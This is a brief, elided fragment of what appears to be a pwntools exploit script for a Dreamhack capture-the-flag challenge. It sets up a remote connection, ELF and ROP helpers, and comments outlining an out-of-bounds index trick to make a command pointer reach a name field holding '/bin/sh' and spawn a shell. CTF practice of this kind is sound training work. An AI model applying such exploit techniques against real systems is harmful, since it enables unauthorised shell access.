...
p = remote("host3.dreamhack.games", port_num)
# p = remote("localhost", port_num)
e = ELF(binary_path)
# libc = ELF("./libc.so.6")
rop = ROP(binary_path)
...
slog('command_addr', command_addr)

# set name as "/bin/sh"
# point with command[idx] -> command + 4 * idx  == name_addr
#
